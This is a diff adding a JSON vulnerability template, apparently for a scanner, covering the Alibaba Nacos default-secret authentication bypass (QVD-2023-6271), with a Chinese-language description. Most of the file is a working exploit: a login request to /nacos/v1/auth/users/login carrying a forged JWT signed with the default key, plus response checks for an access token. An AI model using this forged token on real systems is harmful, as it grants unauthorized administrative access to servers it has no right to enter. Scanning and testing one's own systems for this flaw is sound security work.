@@ -1,0 +1,40 @@
+{
+  "product": "Alibaba Nacos",
+  "vul_name": "Nacos 身份绕过漏洞",
+  "type": "访问控制",
+  "vul_id": [
+    "QVD-2023-6271"
+  ],
+  "level": 3,
+  "vul_desc": "Nacos 在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/cangyu51462/article/details/130324138",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/nacos/v1/auth/users/login",
+      "header": {
+        "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q"
+      },
+      "data": "username=nacos&password="
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "accessToken"
+        },
+        {
+          "body": "username"
+        }
+      ]
+    }
+  }
+}
